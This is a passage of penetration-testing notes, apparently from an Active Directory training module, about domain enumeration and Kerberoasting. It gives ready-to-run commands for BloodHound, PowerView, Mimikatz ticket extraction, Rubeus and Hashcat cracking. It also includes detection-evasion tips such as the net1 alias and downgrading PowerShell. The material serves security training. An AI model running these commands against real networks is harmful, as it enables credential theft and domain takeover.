<span class="nv">$ </span>python3 windapsearch.py <span class="nt">--dc-ip</span> &lt;DC_IP&gt; <span class="nt">-u</span> &lt;USERNAME&gt;@&lt;DOMAIN&gt; <span class="nt">-p</span> &lt;PASSWORD&gt; <span class="nt">--da</span>

<span class="c">## Privileged Users</span>
<span class="nv">$ </span>python3 windapsearch.py <span class="nt">--dc-ip</span> &lt;DC_IP&gt; <span class="nt">-u</span> &lt;USERNAME&gt;@&lt;DOMAIN&gt; <span class="nt">-p</span> &lt;PASSWORD&gt; <span class="nt">-PU</span>
</code></pre></div></div>

<h3 id="bloodhoundpy-httpsgithubcomfox-itbloodhoundpy">Bloodhound.py [https://github.com/fox-it/BloodHound.py]</h3>
<p>Once we have domain credentials, we can run the BloodHound.py BloodHound ingestor from our Linux attack host. BloodHound is one of, if not the most impactful tools ever released for auditing Active Directory security, and it is hugely beneficial for us as penetration testers. We can take large amounts of data that would be time-consuming to sift through and create graphical representations or “attack paths” of where access with a particular user may lead. We will often find nuanced flaws in an AD environment that would have been missed without the ability to run queries with the BloodHound GUI tool and visualize issues. The tool uses graph theory to visually represent relationships and uncover attack paths that would have been difficult, or even impossible to detect with other tools. The tool consists of two parts: the SharpHound collector written in C# for use on Windows systems, or for this section, the BloodHound.py collector (also referred to as an ingestor) and the BloodHound GUI tool which allows us to upload collected data in the form of JSON files. Once uploaded, we can run various pre-built queries or write custom queries using Cypher language. The tool collects data from AD such as users, groups, computers, group membership, GPOs, ACLs, domain trusts, local admin access, user sessions, computer and user properties, RDP access, WinRM access, etc.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>bloodhound-python <span class="nt">-u</span> &lt;USERNAME&gt; <span class="nt">-p</span> &lt;PASSWORD&gt; <span class="nt">-ns</span> &lt;DC_IP&gt; <span class="nt">-d</span> inlanefreight.local <span class="nt">-c</span> all 

<span class="c"># Upload the Zip File into the BloodHound GUI**</span>
<span class="nv">$ </span><span class="nb">sudo </span>neo4j start <span class="o">(</span>kali:neo4j, neo4j:kali<span class="o">)</span>
<span class="nv">$ </span>zip <span class="nt">-r</span> ilfreight_bh.zip <span class="k">*</span>.json

<span class="nv">$ </span>bloodhound 
</code></pre></div></div>

<h3 id="activedirectory-powershell-module">ActiveDirectory PowerShell Module</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-Module</span><span class="w">

</span><span class="c"># Load ActiveDirectory Module</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="nx">ActiveDirectory</span><span class="w">

</span><span class="c"># Group Enumeration</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ADGroup</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">name</span><span class="w">

</span><span class="c"># Detailed Group Info</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ADGroup</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"Backup Operators"</span><span class="w">

</span><span class="c"># Group Membership</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ADGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"Backup Operators"</span><span class="w">
</span></code></pre></div></div>

<h3 id="powerview-httpsgithubcompowershellmafiapowersploitblobmasterreconpowerviewps1">PowerView [https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1]</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Domain User Information</span>
PS <span class="o">&gt;</span> Get-DomainUser <span class="nt">-Identity</span> mmorgan <span class="nt">-Domain</span> inlanefreight.local | Select-Object <span class="nt">-Property</span> name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol

<span class="c"># Recursive Group Membership</span>
PS <span class="o">&gt;</span>  Get-DomainGroupMember <span class="nt">-Identity</span> <span class="s2">"Domain Admins"</span> <span class="nt">-Recurse</span>

<span class="c"># We can use the Test-AdminAccess function to test for local admin access on either the current machine or a remote one.</span>
<span class="c">## Testing for Local Admin Access</span>
PS <span class="o">&gt;</span> Test-AdminAccess <span class="nt">-ComputerName</span> ACADEMY-EA-MS01

<span class="c"># Finding Users With SPN Set (kerberostables)</span>
PS <span class="o">&gt;</span> Get-DomainUser <span class="nt">-SPN</span> <span class="nt">-Properties</span> samaccountname,ServicePrincipalName
</code></pre></div></div>

<h3 id="sharpview-httpsgithubcomdmchellsharpview">SharpView [https://github.com/dmchell/SharpView]</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\SharpView.exe</span><span class="w"> </span><span class="nx">Get-DomainUser</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">forend</span><span class="w">
</span></code></pre></div></div>

<h3 id="snaffler-httpsgithubcomsnaffconsnaffler">Snaffler [https://github.com/SnaffCon/Snaffler]</h3>
<p>Snaffler is a tool that can help us acquire credentials or other sensitive data in an Active Directory environment. Snaffler works by obtaining a list of hosts within the domain and then enumerating those hosts for shares and readable directories. Once that is done, it iterates through any directories readable by our user and hunts for files that could serve to better our position within the assessment. Snaffler requires that it be run from a domain-joined host or in a domain-user context.</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\Snaffler.exe</span><span class="w">  </span><span class="nt">-d</span><span class="w"> </span><span class="nx">INLANEFREIGHT.LOCAL</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nt">-v</span><span class="w"> </span><span class="nx">data</span><span class="w">
</span></code></pre></div></div>

<h3 id="bloodhound-httpsgithubcombloodhoundadbloodhound">BloodHound [https://github.com/BloodHoundAD/BloodHound]</h3>
<h4 id="sharphound-httpsgithubcombloodhoundadbloodhoundtreemastercollectors">SharpHound [https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors]</h4>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\SharpHound.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nt">--zipfilename</span><span class="w"> </span><span class="nx">ILFREIGHT</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\SharpHound.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nt">--zipfilename</span><span class="w"> </span><span class="nx">ILFREIGHT</span><span class="w"> </span><span class="nt">--ldapusername</span><span class="w"> </span><span class="nx">AB920</span><span class="w"> </span><span class="nt">--ldappassword</span><span class="w"> </span><span class="nx">weasal</span><span class="w">
</span></code></pre></div></div>

<h3 id="living-off-the-land">Living Off the Land</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Quick Checks Using PowerShell</span><span class="w">
</span><span class="n">whoami</span><span class="w"> </span><span class="nx">/groups</span><span class="w">

</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-Module</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ExecutionPolicy</span><span class="w"> </span><span class="nt">-List</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-ChildItem</span><span class="w"> </span><span class="nx">Env:</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ft</span><span class="w"> </span><span class="nx">key</span><span class="p">,</span><span class="nx">value</span><span class="w">


</span><span class="c"># Downgrade Powershell</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-host</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">powershell.exe</span><span class="w"> </span><span class="nt">-version</span><span class="w"> </span><span class="nx">2</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-host</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">get-module</span><span class="w">

</span><span class="c"># Firewall Checks</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">netsh</span><span class="w"> </span><span class="nx">advfirewall</span><span class="w"> </span><span class="nx">show</span><span class="w"> </span><span class="nx">allprofiles</span><span class="w">


</span><span class="c"># Windows Defender Check (from CMD.exe)</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="n">sc</span><span class="w"> </span><span class="nx">query</span><span class="w"> </span><span class="nx">windefend</span><span class="w">

</span><span class="c"># Get-MpComputerStatus</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-MpComputerStatus</span><span class="w">

</span><span class="c"># Am I Alone?</span><span class="w">
</span><span class="s1">'
When landing on a host for the first time, one important thing is to check and see if you are the only one logged in. If you start taking actions from a host someone else is on, there is the potential for them to notice you. If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.
'</span><span class="w">

</span><span class="c"># Using qwinsta</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">qwinsta</span><span class="w">
</span></code></pre></div></div>

<h4 id="network-information">Network Information</h4>

<table>
  <thead>
    <tr>
      <th>Networking Commands</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>arp -a	Lists all</td>
      <td>known hosts stored in the arp table.</td>
    </tr>
    <tr>
      <td>ipconfig /all</td>
      <td>Prints out adapter settings for the host. We can figure out the network segment from here.</td>
    </tr>
    <tr>
      <td>route print</td>
      <td>Displays the routing table (IPv4 &amp; IPv6) identifying known networks and layer three routes shared with the host.</td>
    </tr>
    <tr>
      <td>netsh advfirewall show state</td>
      <td>Displays the status of the host’s firewall. We can determine if it is active and filtering traffic.</td>
    </tr>
  </tbody>
</table>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Using arp -a</span>
PS <span class="o">&gt;</span> arp <span class="nt">-a</span>

<span class="c"># Viewing the Routing Table</span>
PS <span class="o">&gt;</span> route print

<span class="s1">'
Using arp -a and route print will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment. These are commands we should consider using on each engagement to assist our clients in understanding where an attacker may attempt to go following initial compromise.
'</span>
</code></pre></div></div>

<h4 id="windows-management-instrumentation-wmi">Windows Management Instrumentation (WMI)</h4>
<h5 id="quick-wmi-checks">Quick WMI checks</h5>
<p>|Command | 	Description
|—————————— | —————————–
|wmic qfe get Caption,Description,HotFixID,InstalledOn	Prints the patch level and description of the Hotfixes applied
|wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List	Displays basic host information to include any attributes within the list
|wmic process list /format:list	A listing of all processes on host
|wmic ntdomain list /format:list	Displays information about the Domain and Domain Controllers
|wmic useraccount list /format:list	Displays information about all local accounts and any domain accounts that have logged into the device
|wmic group list /format:list	Information about all local groups
|wmic sysaccount list /format:list	Dumps information about any system accounts that are being used as service accounts.</p>

<h4 id="net-commands">Net Commands</h4>
<p>| Command |	Description
|—————————— | —————————–
| net accounts	| Information about password requirements
| net accounts /domain	 | Password and lockout policy
| net group /domain	| Information about domain groups
| net group “Domain Admins” /domain	| List users with domain admin privileges
| net group “domain computers” /domain	| List of PCs connected to the domain
| net group “Domain Controllers” /domain	| List PC accounts of domains controllers
| net group <domain_group_name> /domain	| User that belongs to the group
| net groups /domain	| List of domain groups
| net localgroup	| All available groups
| net localgroup administrators /domain	| List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
| net localgroup Administrators	| Information about a group (admins)
| net localgroup administrators [username] /add	| Add user to administrators
| net share |	Check current shares
| net user <ACCOUNT_NAME> /domain	| Get information about a user within the domain
| net user /domain	| List all users of the domain
| net user %username%	| Information about the current user
| net use x: \computer\share	| Mount the share locally
| net view	| Get a list of computers
| net view /all /domain[:domainname]	| Shares on the domains
| net view \computer /ALL	| List shares of a computer
| net view /domain	| List of PCs of the domain</ACCOUNT_NAME></domain_group_name></p>

<h5 id="net-commands-trick">Net Commands Trick</h5>
<p>If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing net1 instead of net will execute the same functions without the potential trigger from the net string.</p>

<h4 id="dsquery">Dsquery</h4>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># User Search</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">dsquery</span><span class="w"> </span><span class="nx">user</span><span class="w">

</span><span class="c"># Computer Search</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">dsquery</span><span class="w"> </span><span class="nx">computer</span><span class="w">

</span><span class="c"># Wildcard Search</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">dsquery</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="s2">"CN=Users,DC=INLANEFREIGHT,DC=LOCAL"</span><span class="w">

</span><span class="c"># Users With Specific Attributes Set (PASSWD_NOTREQD)</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">dsquery</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-filter</span><span class="w"> </span><span class="s2">"(&amp;(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))"</span><span class="w"> </span><span class="nt">-attr</span><span class="w"> </span><span class="nx">distinguishedName</span><span class="w"> </span><span class="nx">userAccountControl</span><span class="w">

</span><span class="c"># Searching for Domain Controllers</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">dsquery</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-filter</span><span class="w"> </span><span class="s2">"(userAccountControl:1.2.840.113556.1.4.803:=8192)"</span><span class="w"> </span><span class="nt">-limit</span><span class="w"> </span><span class="nx">5</span><span class="w"> </span><span class="nt">-attr</span><span class="w"> </span><span class="nx">sAMAccountName</span><span class="w">
</span></code></pre></div></div>

<hr />

<h2 id="kerberoasting">Kerberoasting</h2>
<p>Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as NT AUTHORITY\LOCAL SERVICE. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. All you need to perform a Kerberoasting attack is an account’s cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.</p>

<p>Domain accounts running services are often local administrators, if not highly privileged domain accounts. Due to the distributed nature of systems, interacting services, and associated data transfers, service accounts may be granted administrator privileges on multiple servers across the enterprise. Many services require elevated privileges on various systems, so service accounts are often added to privileged groups, such as Domain Admins, either directly or via nested membership. Finding SPNs associated with highly privileged accounts in a Windows environment is very common. Retrieving a Kerberos ticket for an account with an SPN does not by itself allow you to execute commands in the context of this account. However, the ticket (TGS-REP) is encrypted with the service account’s NTLM hash, so the cleartext password can potentially be obtained by subjecting it to an offline brute-force attack with a tool such as Hashcat.</p>

<p>Service accounts are often configured with weak or reused password to simplify administration, and sometimes the password is the same as the username. If the password for a domain SQL Server service account is cracked, you are likely to find yourself as a local admin on multiple servers, if not Domain Admin. Even if cracking a ticket obtained via a Kerberoasting attack gives a low-privilege user account, we can use it to craft service tickets for the service specified in the SPN. For example, if the SPN is set to MSSQL/SRV01, we can access the MSSQL service as sysadmin, enable the xp_cmdshell extended procedure and gain code execution on the target SQL server.</p>

<h3 id="linux-2">Linux</h3>
<h4 id="kerberoasting---performing-the-attack">Kerberoasting - Performing the Attack</h4>
<p>Depending on your position in a network, this attack can be performed in multiple ways:</p>

<ul>
  <li>From a non-domain joined Linux host using valid domain user credentials.</li>
  <li>From a domain-joined Linux host as root after retrieving the keytab file.</li>
  <li>From a domain-joined Windows host authenticated as a domain user.</li>
  <li>From a domain-joined Windows host with a shell in the context of a domain account.</li>
  <li>As SYSTEM on a domain-joined Windows host.</li>
  <li>From a non-domain joined Windows host using runas /netonly.</li>
</ul>

<p>Several tools can be utilized to perform the attack:</p>

<ul>
  <li>Impacket’s GetUserSPNs.py [https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py] from a non-domain joined Linux host.</li>
  <li>A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.</li>
  <li>From Windows, utilizing tools such as PowerView[https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1], Rubeus[https://github.com/GhostPack/Rubeus], and other PowerShell scripts.</li>
</ul>

<p>Obtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid credentials, and the ticket must still be cracked offline with a tool such as Hashcat to obtain the cleartext password. TGS tickets take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.</p>

<h4 id="kerberoasting-with-getuserspnspy">Kerberoasting with GetUserSPNs.py</h4>
<p><code class="language-plaintext highlighter-rouge">A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.</code></p>

<p>We can start by just gathering a listing of SPNs in the domain. To do this, we will need a set of valid domain credentials and the IP address of a Domain Controller. We can authenticate to the Domain Controller with a cleartext password, NT password hash, or even a Kerberos ticket. For our purposes, we will use a password. Entering the below command will generate a credential prompt and then a nicely formatted listing of all SPN accounts. From the output below, we can see that several accounts are members of the Domain Admins group. If we can retrieve and crack one of these tickets, it could lead to domain compromise. It is always worth investigating the group membership of all accounts because we may find an account with an easy-to-crack ticket that can help us further our goal of moving laterally/vertically in the target domain.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Listing SPN Accounts with GetUserSPNs.py</span>
<span class="nv">$ </span>GetUserSPNs.py <span class="nt">-dc-ip</span> &lt;DC_IP&gt; &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt;

<span class="s2">"""
We can now pull all TGS tickets for offline processing using the -request flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or John the Ripper for offline password cracking attempts.
"""</span>
<span class="c"># Requesting all TGS Tickets</span>
<span class="nv">$ </span>GetUserSPNs.py <span class="nt">-dc-ip</span> &lt;DC_IP&gt; &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt; <span class="nt">-request</span>

<span class="s2">"""
We can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the sqldev account.
"""</span>
<span class="c"># Requesting a Single TGS ticket</span>
<span class="nv">$ </span>GetUserSPNs.py <span class="nt">-dc-ip</span> &lt;DC_IP&gt; &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt; <span class="nt">-request-user</span> &lt;DC_USER&gt;

<span class="c"># Saving the TGS Ticket to an Output File</span>
<span class="nv">$ </span>GetUserSPNs.py <span class="nt">-dc-ip</span> &lt;DC_IP&gt; &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt; <span class="nt">-request-user</span> &lt;DC_USER&gt; <span class="nt">-outputfile</span> &lt;FILENAME&gt;
</code></pre></div></div>

<h3 id="windows-2">Windows</h3>
<h4 id="kerberoasting---semi-manual-method">Kerberoasting - Semi Manual method</h4>
<h5 id="enumerating-spns-with-setspnexe">Enumerating SPNs with setspn.exe</h5>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; setspn.exe -Q */*
</code></pre></div></div>

<p><strong>Targeting a Single User</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; Add-Type -AssemblyName System.IdentityModel
&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
</code></pre></div></div>

<p><strong>Retrieving All Tickets Using setspn.exe</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS &gt; setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
</code></pre></div></div>

<h5 id="extracting-tickets-from-memory-with-mimikatz">Extracting Tickets from Memory with Mimikatz</h5>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz # base64 /out:true
mimikatz # kerberos::list /export  

</code></pre></div></div>

<p><strong>Preparing the Base64 Blob for Cracking</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ echo "&lt;base64 blob&gt;" |  tr -d \\n 
</code></pre></div></div>

<p><strong>Placing the Output into a File as .kirbi</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat encoded_file | base64 -d &gt; sqldev.kirbi
</code></pre></div></div>

<p><strong>Extracting the Kerberos Ticket using kirbi2john.py</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python2.7 kirbi2john.py sqldev.kirbi
</code></pre></div></div>

<p><strong>Modifiying crack_file for Hashcat</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file &gt; sqldev_tgs_hashcat
</code></pre></div></div>

<h4 id="using-powerview-to-extract-tgs-tickets-httpsrawgithubusercontentcompowershellmafiapowersploitmasterreconpowerviewps1">Using PowerView to Extract TGS Tickets [https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1]</h4>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">

</span><span class="c"># Get Kerberoastable acconts</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-DomainUser</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-spn</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">samaccountname</span><span class="w">

</span><span class="c"># Using PowerView to Target a Specific User</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-DomainUser</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">sqldev</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-DomainSPNTicket</span><span class="w"> </span><span class="nt">-Format</span><span class="w"> </span><span class="nx">Hashcat</span><span class="w">

</span><span class="c"># Exporting All Tickets to a CSV File</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-DomainUser</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-SPN</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-DomainSPNTicket</span><span class="w"> </span><span class="nt">-Format</span><span class="w"> </span><span class="nx">Hashcat</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Export-Csv</span><span class="w"> </span><span class="o">.</span><span class="nx">\ilfreight_tgs.csv</span><span class="w"> </span><span class="nt">-NoTypeInformation</span><span class="w">

</span><span class="c"># Viewing the Contents of the .CSV File</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="o">.</span><span class="nx">\ilfreight_tgs.csv</span><span class="w">
</span></code></pre></div></div>

<p>We can also use Rubeus from GhostPack to perform Kerberoasting even faster and easier. Rubeus provides us with a variety of options for performing Kerberoasting.</p>

<h4 id="using-rubeus-httpsgithubcomghostpackrubeus">Using Rubeus [https://github.com/GhostPack/Rubeus]</h4>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\Rubeus.exe</span><span class="w">

</span><span class="c"># Using the /stats Flag</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\Rubeus.exe</span><span class="w"> </span><span class="nx">kerberoast</span><span class="w"> </span><span class="nx">/stats</span><span class="w">

</span><span class="s2">"""
If we saw any SPN accounts with their passwords set 5 or more years ago, they could be promising targets as they could have a weak password that was set and never changed when the organization was less mature.
"""</span><span class="w">

</span><span class="c"># Using the /nowrap Flag</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\Rubeus.exe</span><span class="w"> </span><span class="nx">kerberoast</span><span class="w"> </span><span class="nx">/ldapfilter:</span><span class="s1">'admincount=1'</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\Rubeus.exe</span><span class="w"> </span><span class="nx">kerberoast</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">

</span><span class="c"># Exporting to file</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\Rubeus.exe</span><span class="w"> </span><span class="nx">kerberoast</span><span class="w"> </span><span class="nx">/outfile:out.txt</span><span class="w">
</span></code></pre></div></div>

<h3 id="cracking-the-ticket-offline-with-hashcat">Cracking the Ticket Offline with Hashcat</h3>
<h4 id="a-note-on-encryption-types">A Note on Encryption Types</h4>
<p><code class="language-plaintext highlighter-rouge">The below examples on encryption types are not reproducible in the module lab because the target Domain Controller is running Windows Server 2019. More on that later in the section.</code></p>

<p>Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. When performing Kerberoasting in most environments, we will retrieve hashes that begin with $krb5tgs$23$<em>, an RC4 (type 23) encrypted ticket. Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with $krb5tgs$18$</em>. While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using Hashcat, it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS &gt; .\Rubeus.exe kerberoast /user:testspn /nowrap
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS &gt; Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
</code></pre></div></div>
<p>Checking with PowerView, we can see that the msDS-SupportedEncryptionTypes attribute is set to 0. The chart here[https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797] tells us that a decimal value of 0 means that a specific encryption type is not defined and set to the default of RC4_HMAC_MD5.</p>

<h6 id="cracking-the-ticket-with-hashcat--rockyoutxt">Cracking the Ticket with Hashcat &amp; rockyou.txt</h6>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
</code></pre></div></div>

<p>If we check this with PowerView, we’ll see that the msDS-SupportedEncryptionTypes attribute is set to 24, meaning that AES 128/256 encryption types are the only ones supported.</p>

<h6 id="running-hashcat">Running Hashcat</h6>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
</code></pre></div></div>

<h6 id="using-the-tgtdeleg-flag">Using the /tgtdeleg Flag</h6>
<p>We can use Rubeus with the /tgtdeleg flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.</p>

